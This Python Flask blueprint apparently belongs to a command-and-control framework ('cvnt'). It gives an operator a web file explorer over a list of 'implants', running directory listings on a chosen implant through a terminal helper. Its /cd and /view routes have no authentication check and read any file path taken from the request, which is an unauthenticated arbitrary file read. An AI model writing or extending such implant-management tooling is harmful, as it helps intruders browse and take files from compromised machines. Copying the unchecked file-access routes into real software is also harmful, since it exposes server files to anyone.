# Import necessary modules and libraries
from flask import Blueprint, session, redirect, url_for, render_template, request
from cvnt.db_operations import get_list
from wtforms import SelectField
from cvnt.blueprint_terminal import Terminal, analyze_input
from flask_wtf import FlaskForm
import os

# Define the Blueprint for the file explorer
explorer = Blueprint('explorer', __name__, template_folder='templates', static_folder='static')

# Define the Menu form class
class Menu(FlaskForm):
    selected_implant = SelectField('Select Implant', choices=[])

# Handle root route
@explorer.route('/explorer')
def root():
    # Check if the user is authenticated
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('basic.login_success'))
    
    # Default implant ID
    implant_id = "slayyy"

    # Get the list of implants
    implants = get_list()

    # Create Menu form
    menu = Menu()
    menu.selected_implant.choices = implants

    # Create Terminal form
    form = Terminal()

    # Process form submission
    if menu.validate_on_submit():
        # Get the selected implant ID from the form
        implant_id = menu.selected_implant.data

    # Call analyze_input function with the selected implant ID and "ls" command
    file_list = analyze_input(form, implant_id)

    # Render the template with necessary data
    return render_template('explorer.html', current_working_directory='.', form=menu,
                            file_list=file_list, implants=implants, implant_id=implant_id) 

# Handle 'cd' command
@explorer.route('/cd')
def cd():
    # Run 'level up' command
    os.chdir(request.args.get('path'))
    
    # Redirect to file manager
    return redirect('/explorer')

# Handle listing files and directories
@explorer.route('/new', methods=['POST'])
def new():
    # Get the selected implant ID from the form data
    implant_id = request.form['selected_implant']

    # Create a new Terminal form
    form = Terminal()

    # Call analyze_input function with the selected implant ID and "ls" command
    file_list = analyze_input(form, implant_id)

    # Render the template with file list
    return render_template('explorer.html', current_working_directory='.', form=form,
                           file_list=file_list, implants=get_list(), implant_id=implant_id)

# Handle viewing text files
@explorer.route('/view')
def view():
    # Get the file content
    with open(request.args.get('file')) as f:
        return f.read().replace('\n', '<br>')
